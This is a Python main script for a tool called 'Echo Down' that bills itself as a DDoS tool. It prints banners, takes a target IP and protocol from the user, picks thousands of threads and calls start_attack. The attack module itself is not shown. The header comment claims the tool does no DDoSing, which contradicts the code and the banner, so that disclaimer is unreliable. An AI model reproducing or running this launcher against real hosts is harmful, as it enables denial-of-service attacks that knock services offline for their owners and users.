#
# ███████╗░█████╗░██╗░░██╗░█████╗░  ██████╗░░█████╗░░██╗░░░░░░░██╗███╗░░██╗
# ██╔════╝██╔══██╗██║░░██║██╔══██╗  ██╔══██╗██╔══██╗░██║░░██╗░░██║████╗░██║
# █████╗░░██║░░╚═╝███████║██║░░██║  ██║░░██║██║░░██║░╚██╗████╗██╔╝██╔██╗██║
# ██╔══╝░░██║░░██╗██╔══██║██║░░██║  ██║░░██║██║░░██║░░████╔═████║░██║╚████║
# ███████╗╚█████╔╝██║░░██║╚█████╔╝  ██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║
# ╚══════╝░╚════╝░╚═╝░░╚═╝░╚════╝░  ╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝
#
#                   https://github.com/3kh0/echodown
#
#      Yes, this tool does not do any DDoSing, that would be illegal!
#

import random
from termcolor import colored
from connection import check_connection
from attack import start_attack
from user_input import get_ip_address, get_protocol

def main():
  print()
  print(colored("Starting Echo Down, please hold on!", "red"))
  print(colored("I am sure you are using this for legal purposes - Echo", "red"))
  print()

  check_connection()

  global IP, PROTOCOLS, THREADS
  print("")
  print("")
  print(colored("     ███████╗░█████╗░██╗░░██╗░█████╗░  ██████╗░░█████╗░░██╗░░░░░░░██╗███╗░░██╗","red",))
  print(colored("     ██╔════╝██╔══██╗██║░░██║██╔══██╗  ██╔══██╗██╔══██╗░██║░░██╗░░██║████╗░██║","red",))
  print(colored("     █████╗░░██║░░╚═╝███████║██║░░██║  ██║░░██║██║░░██║░╚██╗████╗██╔╝██╔██╗██║","red",))
  print(colored("     ██╔══╝░░██║░░██╗██╔══██║██║░░██║  ██║░░██║██║░░██║░░████╔═████║░██║╚████║","red",))
  print(colored("     ███████╗╚█████╔╝██║░░██║╚█████╔╝  ██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║","red",))
  print(colored("     ╚══════╝░╚════╝░╚═╝░░╚═╝░╚════╝░  ╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝","red",))
  print("")
  print(colored("                      The most powerful DDoS tool out there","red",attrs=["bold"],))
  print("")

  threads = random.randint(5000, 10000)

  print(colored("Launched with " + str(threads) + " threads.", "cyan"))
  print()

  ip = get_ip_address()
  protocol = get_protocol()
  IP = ip
  protocol = protocol
  threads = threads

  start_attack(IP, protocol, threads)

if __name__ == "__main__":
  main()